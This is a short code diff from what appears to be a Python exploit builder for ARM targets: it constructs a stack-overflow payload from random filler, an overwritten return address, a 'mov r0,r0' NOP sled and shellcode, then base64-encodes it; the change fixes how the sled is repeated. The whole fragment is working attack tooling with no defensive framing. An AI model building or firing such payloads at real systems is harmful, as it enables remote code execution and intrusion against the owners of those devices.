@@ -34,7 +34,7 @@ def build_shellcode():
         return open(b, "rb").read()
 
 
-SLED = b"\x00\x00\xa0\xe1" * 256   # mov r0,r0
+SLED = b"\x00\x00\xa0\xe1"   # mov r0,r0 (repeat to length at build time)
 
 
 def build(offset, marker=None, addr=None, sled=0, padpc=1):
@@ -43,7 +43,7 @@ def build(offset, marker=None, addr=None, sled=0, padpc=1):
     filler = bytes(random.getrandbits(8) for _ in range(offset))
     val = marker if marker is not None else addr
     pc = (val.to_bytes(4, "little") * max(1, padpc)) if val is not None else b""
-    return base64.b64encode(filler + pc + SLED[:sled] + sc).decode()
+    return base64.b64encode(filler + pc + SLED * (sled // 4) + sc).decode()
 
 
 def sha(s):
